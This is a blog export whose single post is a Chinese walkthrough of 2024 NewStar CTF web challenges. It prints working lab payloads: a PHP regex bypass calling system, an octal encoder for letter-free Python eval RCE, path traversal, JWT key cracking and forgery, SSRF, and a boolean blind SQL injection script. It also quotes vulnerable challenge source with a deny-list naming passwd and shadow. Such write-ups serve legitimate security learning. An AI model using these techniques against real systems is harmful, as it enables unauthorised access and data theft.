{"meta":{"title":"Somebird的林间小仓库","subtitle":"Recording for Remembering","description":"记录成长之路","author":"Somebird","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2024-12-25T14:33:58.000Z","updated":"2024-12-25T14:35:29.868Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2024-12-25T14:24:22.000Z","updated":"2024-12-25T14:32:19.490Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"2024NewStarCTF_WP_Web","slug":"2024NewStarCTF-WP-Web","date":"2024-12-28T15:18:43.000Z","updated":"2025-02-17T03:50:23.414Z","comments":true,"path":"2024/12/28/2024NewStarCTF-WP-Web/","permalink":"http://example.com/2024/12/28/2024NewStarCTF-WP-Web/","excerpt":"","text":"西电链接： 西电 CTF 终端 Week 2pangbai过家家(2) 连接进入，叫清点泄露文件 首先用dirsearch扫一下目录 发现.git文件，确定为git泄露，用Githack把泄露的文件下载下来 log和branch都没有找到后门，还有可能的就是stash(临时保存区)了 Git – Stash命令|极客教程 发现后面，用stash apply将暂存区重新应用 找到后门文件源代码，发现是一个正则表达式绕过 关键点1：非法字符转换下划线 故这里在提交payload时，NewStar_CTF.2024要写为NewStar[CTF.2024 关键点2：正则表达式首位检测绕过 preg_match默认为单行模式，如果字符串末尾是换行符，则换行符会被当做行尾而不是字符串的一部分，但是在严格不等于!&#x3D;&#x3D;中，”Welcome”和”Welcome\\n”是不等的， 所以这里构造的最终payload是 NewStar[CTF.2024&#x3D;Welcome%0a（%0a是换行符的url编码） func&#x3D;system args&#x3D;’ls &#x2F;‘ 传入发现没有回显，猜测是ls &#x2F;被过滤了或者缺少权限（？其实我也不知道为什么），因为之前的flag大部分都在环境变量里，所以这里尝试用env语句打印环境变量 得到flag 遗失的拉链题目是拉链，想到zip，应该是一个.zip源码泄露，所以先扫一下目录看看 果然有，下载下来，拿到源代码 有一个php内容如下 是一个简单的比较绕过 sha_1和md5强相等，这个应该是很难找到两个字符符合要求的，所以想到传入两个数组，这样两个函数的返回值都是null，就可以强相等了，同时也绕过了不等号 代码里把cat和flag过滤了，我们用和cat效果差不多的more来读取文件，flag也不用打全，用通配符*即可 week 3臭皮的计算器载入页面，叫我们去&#x2F;cal路径，来到这个路径后，查看源代码，发现后端flask源码直接给了 源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from flask import Flask, render_template, requestimport uuidimport subprocessimport osimport tempfileapp = Flask(__name__)app.secret_key = str(uuid.uuid4())def waf(s): token = True for i in s: if i in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;: token = False break return token@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/calc&quot;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def calc(): if request.method == &#x27;POST&#x27;: num = request.form.get(&quot;num&quot;) script = f&#x27;&#x27;&#x27;import osprint(eval(&quot;&#123;num&#125;&quot;))&#x27;&#x27;&#x27; print(script) if waf(num): try: result_output = &#x27;&#x27; with tempfile.NamedTemporaryFile(mode=&#x27;w+&#x27;, suffix=&#x27;.py&#x27;, delete=False) as temp_script: temp_script.write(script) temp_script_path = temp_script.name result = subprocess.run([&#x27;python3&#x27;, temp_script_path], capture_output=True, text=True) os.remove(temp_script_path) result_output = result.stdout if result.returncode == 0 else result.stderr except Exception as e: result_output = str(e) return render_template(&quot;calc.html&quot;, result=result_output) else: return render_template(&quot;calc.html&quot;, result=&quot;臭皮！你想干什么！！&quot;) return render_template(&quot;calc.html&quot;, result=&#x27;试试呗&#x27;)if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, port=30002) 分析源码可得，我们输入num，程序自动计算num的表达式数值，且用到了eval函数，这里包含一个RCE漏洞，但关键在于，还有一个防火墙，过滤了所有字母，所以是一个无字母的RCE。 python的无字母rce，用的比较多的是八进制绕过，这里简单写一个程序把我们的payload转为八进制编码。 12345678txt=input(&quot;payload:&quot;)payload=&quot;&quot;for i in txt: if i.isalpha() or i==&#x27;_&#x27; : payload+=&#x27;\\\\&#x27;+oct(ord(i))[2:] else: payload+=iprint(payload) 传入得到flag 这照片是你吗连入环境，日常看源代码找提示 这里不太看得明白其中的原理，但隐约感觉应该有任意文件读取的漏洞，这里随便试一下访问图片 看上去是可以用路径访问文件的，那么就得弄明白源代码在哪，继续收集信息发现 这里的server是python，应该是flask，那么源代码应该是在app.py 而且一般flask的静态文件都放在和app.py同目录的static文件夹里，猜测可能当前目录就是static，试试路径穿透 注意这里不要直接在浏览器目录端口写..&#x2F;，会被过滤掉，要抓包后修改 拿到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178from flask import Flask, make_response, render_template_string, request, redirect, send_fileimport uuidimport jwtimport timeimport osimport requestsfrom flag import get_random_number_stringbase_key = str(uuid.uuid4()).split(&quot;-&quot;)secret_key = get_random_number_string(6)admin_pass = &quot;&quot;.join([ _ for _ in base_key])print(admin_pass)app = Flask(__name__)failure_count = 0users = &#123; &#x27;admin&#x27;: admin_pass, &#x27;amiya&#x27;: &quot;114514&quot;&#125;def verify_token(token): try: global failure_count if failure_count &gt;= 100: return make_response(&quot;You have tried too many times! Please restart the service!&quot;, 403) data = jwt.decode(token, secret_key, algorithms=[&quot;HS256&quot;]) if data.get(&#x27;user&#x27;) != &#x27;admin&#x27;: failure_count += 1 return make_response(&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 403) except: return make_response(&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 401) return True@app.route(&#x27;/&#x27;)def index(): return redirect(&quot;/home&quot;)@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def login(): username = request.form[&#x27;username&#x27;] password = request.form[&#x27;password&#x27;] global failure_count if failure_count &gt;= 100: return make_response(&quot;You have tried too many times! Please restart the service!&quot;, 403) if users.get(username)==password: token = jwt.encode(&#123;&#x27;user&#x27;: username, &#x27;exp&#x27;: int(time.time()) + 600&#125;, secret_key) response = make_response(&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;) response.set_cookie(&#x27;token&#x27;, token) return response else: failure_count += 1 return make_response(&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;, 401)@app.route(&#x27;/logout&#x27;)def logout(): response = make_response(&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;) response.set_cookie(&#x27;token&#x27;, &#x27;&#x27;, expires=0) return response@app.route(&#x27;/home&#x27;)def home(): logged_in = False try: token = request.cookies.get(&#x27;token&#x27;) data = jwt.decode(token, secret_key, algorithms=[&quot;HS256&quot;]) text = &quot;Hello, %s!&quot; % data.get(&#x27;user&#x27;) logged_in = True except: logged_in = False text = &quot;You have not logged in!&quot; data = &#123;&#125; return render_template_string(r&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Home Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 图标能够正常显示耶! --&gt; &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt; &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt; &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt; &#123;&#123; text &#125;&#125;&lt;br&gt; &#123;% if logged_in %&#125; &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt; &#123;% else %&#125; &lt;h2&gt;登录&lt;/h2&gt; &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt; 用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt; 密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt; &#123;% endif %&#125; &lt;br&gt; &#123;% if user==&quot;admin&quot; %&#125; &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt; &lt;img src=&quot;/2.png&quot;&gt; &#123;% else %&#125; &lt;img src=&quot;/1.png&quot;&gt; &#123;% endif %&#125; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27;, text=text, logged_in=logged_in, user=data.get(&#x27;user&#x27;))@app.route(&#x27;/admin&#x27;)def admin(): try: token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) resp_text = render_template_string(r&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Admin Panel&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Admin Panel&lt;/h1&gt; &lt;p&gt;GET Server Info from api:&lt;/p&gt; &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt; &lt;button onclick=execute()&gt;Execute&lt;/button&gt; &lt;script&gt; function execute() &#123; fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value, &#123;credentials: &quot;include&quot;&#125; ).then(res =&gt; res.text()).then(data =&gt; &#123; document.write(data); &#125;); &#125; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27;, api_url=request.host_url+&quot;/api&quot;, url=request.host_url) resp = make_response(resp_text) resp.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27; return resp except: return make_response(&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;, 401)@app.route(&#x27;/execute&#x27;)def execute(): token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) api_address = request.args.get(&quot;api_address&quot;) if not api_address: return make_response(&quot;No api address!&quot;, 400) response = requests.get(api_address, cookies=&#123;&#x27;token&#x27;: token&#125;) return response.text@app.route(&quot;/api&quot;)def api(): token = request.cookies.get(&#x27;token&#x27;) if verify_token(token) != True: return verify_token(token) resp = make_response(f&quot;Server Info: &#123;os.popen(&#x27;uname -a&#x27;).read()&#125;&quot;) resp.headers[&#x27;Access-Control-Allow-Credentials&#x27;] = &#x27;true&#x27; return resp@app.route(&quot;/&lt;path:file&gt;&quot;)def static_file(file): print(file) restricted_keywords = [&quot;proc&quot;, &quot;env&quot;, &quot;passwd&quot;, &quot;shadow&quot;, &quot;hosts&quot;, &quot;sys&quot;, &quot;log&quot;, &quot;etc&quot;, &quot;bin&quot;, &quot;lib&quot;, &quot;tmp&quot;, &quot;var&quot;, &quot;run&quot;, &quot;dev&quot;, &quot;home&quot;, &quot;boot&quot;] if any(keyword in file for keyword in restricted_keywords): return make_response(&quot;STOP!&quot;, 404) if not os.path.exists(&quot;./static/&quot; + file): return make_response(&quot;Not found!&quot;, 404) return send_file(&quot;./static/&quot; + file)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=5000) 分析源代码发现这里用了JWT令牌进行身份验证，而且密钥只有六位数字！！完全可以爆破。 这里还给了一个用户名和密码，直接用提供的用户账号登进去，获取一个token样例 用JWTcrack破解密钥 用在线JWT生成来伪造令牌，注意这里的exp里包含了令牌的有效时间，可以通过把数字加大来延长有效时间 成功伪造admin身份 管理员面板给了一个api，可以访问本地链接，那么应该有一个SSRF漏洞在这里，但是在哪呢？ 继续分析源代码，发现一个奇怪的地方 可见这里导入了一个自定义库，那应该就是在与app.py的同目录下有一个flag.py 得到内容 123456789101112131415161718from flask import Flaskimport osimport randomdef get_random_number_string(length): return &#x27;&#x27;.join([str(random.randint(0, 9)) for _ in range(length)])get_flag = Flask(&quot;get_flag&quot;)FLAG = os.environ.pop(&quot;ICQ_FLAG&quot;, &quot;flag&#123;test_flag&#125;&quot;)@get_flag.route(&quot;/fl4g&quot;)#如何触发它呢?def flag(): return FLAGif __name__ == &quot;__main__&quot;: get_flag.run(host=&quot;127.0.0.1&quot;,port=5001) 直接用管理员面板访问5001端口的&#x2F;fl4g即可 臭屁踩踩背西电终端的环境坏了，写不了，这里放一下官方题解的链接【讲的很好，强推！！！】 NewStar CTF 2024 - 西电 CTF 终端 blindsql1sqlmap不会用，以前从来没有手敲过盲注脚本，这里就简单记一下题解的脚本，以后当模板用。 1234567891011121314151617181920212223242526272829303132import requests,string,timeurl = &#x27;&#x27;result = &#x27;&#x27;for i in range(1,100): print(f&#x27;[+] Bruting at &#123;i&#125;&#x27;) for c in string.ascii_letters + string.digits + &#x27;_-&#123;&#125;&#x27;: time.sleep(0.2) # 限制速率，防止请求过快 print(&#x27;[+] Trying:&#x27;, c) # 这条语句能查询到当前数据库所有的表名 tables = f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27; # 获取所有表名的第 i 个字符，并计算 ascii 值 char = f&#x27;(ord(mid(&#123;tables&#125;,&#123;i&#125;,1)))&#x27; # 爆破该 ascii 值 b = f&#x27;((&#123;char&#125;)in(&#123;ord(c)&#125;))&#x27; # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据 p = f&#x27;Alice\\&#x27;and(&#123;b&#125;)#&#x27; res = requests.get(url, params=&#123;&#x27;student_name&#x27;: p&#125;) if &#x27;Alice&#x27; in res.text: print(&#x27;[*]bingo:&#x27;,c) result += c print(result) break union 被禁用，说明此时该使用盲注，我们能够通过插入 and 1 或者 and 0 来控制是否返回数据，由此可以使用布尔盲注 = 的绕过可以使用 like 或者 in 代替 空格和斜杠 / 被禁用，可以使用括号代替 Week 4Pangbai过家家（4）打开发现这么一个东西，问了问AI，是Go语言的SSTI，于是赶紧去学了一下Go语言SSTI相关的东西 相关文章：[Go语言]SSTI从0到1_go ssti-CSDN博客 分析给我们的源代码，可知当前对象是helper，有两个成员结构体，我们要看的Config，因为Config给了我JWT的key，不用往下翻就知道待会儿设计cookie伪造。 拿到密钥，直接丢到在线平台伪造。（JSON Web Tokens - jwt.io，这个好使） 继续往下看可以看到一个文件读取函数，应该是任意文件读取漏洞，读的是config.SignaturePath的内容，要想办法对内容进行篡改。 相关代码在这里，可见要用PUT方法，而且要求IP为本机。把要修改的路径放在包的主体即可。 这里我们直接改包，然后加一个报头Host，设置为本机。读取环境变量文件。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTFwp","slug":"CTFwp","permalink":"http://example.com/tags/CTFwp/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTFwp","slug":"CTFwp","permalink":"http://example.com/tags/CTFwp/"}]}